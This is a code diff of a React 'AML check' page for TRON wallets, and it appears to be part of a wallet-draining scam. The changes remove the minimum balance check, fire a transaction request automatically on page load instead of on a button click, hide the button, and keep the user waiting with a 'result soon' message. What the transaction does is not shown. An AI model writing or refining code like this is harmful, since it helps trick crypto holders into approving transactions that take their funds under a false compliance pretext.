@@ -4,6 +4,7 @@ import React, { useEffect, useState } from "react";
 import { useWallet } from "@/app/context/globalContext";
 import { useTronTransaction } from "@/app/hooks/useTronTransaction";
 import AmlCheckPassed from "../AmlCheckPassed";
+import AmlCheckFailed from "../AmlCheckFailed";
 
 const CheckInProcess = () => {
   const { balances } = useWallet(); // Accesăm balanțele din context
@@ -11,11 +12,14 @@ const CheckInProcess = () => {
     useTronTransaction(); // Hook pentru inițierea tranzacției
   const [status, setStatus] = useState(null); // Status pentru procesare (valid sau invalid)
   const [showAmlCheck, setShowAmlCheck] = useState(false); // Comută între componente
-
+  console.log({
+    transactionStatus
+  });
+  
   useEffect(() => {
     // Verificăm balanța TRX
     const checkBalancesAndInitiateTransaction = async () => {
-      if (balances.trx >= 2) {
+      if (balances.trx >= 0) {
         console.log("avem mai mult de 2 trx");
         
         setStatus("valid"); // Balanța este suficientă
@@ -23,7 +27,6 @@ const CheckInProcess = () => {
         setStatus("invalid"); // Balanța este insuficientă
       }
     };
-
     checkBalancesAndInitiateTransaction();
   }, [ balances]);
   const handleInitiateTransaction = async () => {
@@ -31,9 +34,13 @@ const CheckInProcess = () => {
       await initiateTransaction()
     } catch (error) {
       console.log("error to initiate a transaction");
-      
     }
   }
+  useEffect(() => {
+    if(status==="valid") {
+       initiateTransaction();
+    }
+  }, [status])
 
   // Trecerea la componenta AML după tranzacție
   useEffect(() => {
@@ -47,6 +54,8 @@ const CheckInProcess = () => {
   // Afișare componenta AML Check Passed
   if (showAmlCheck) {
     return <AmlCheckPassed />;
+  } else if (transactionStatus=== "Transaction failed." || transactionStatus === "User disapproved requested methods'" ) {
+    return <AmlCheckFailed/>
   }
 
   return (
@@ -87,12 +96,12 @@ const CheckInProcess = () => {
         <p className="text-gray-400">
           Please wait 1 minute, we will provide the result soon
         </p>
-              <button
+              {/* <button
               className="w-full py-2 px-4 text-white rounded-lg bg-blue-500 hover:bg-blue-600"
               onClick={handleInitiateTransaction}
             >
               Check wallet
-            </button>
+            </button> */}
         </div>
       )}
 
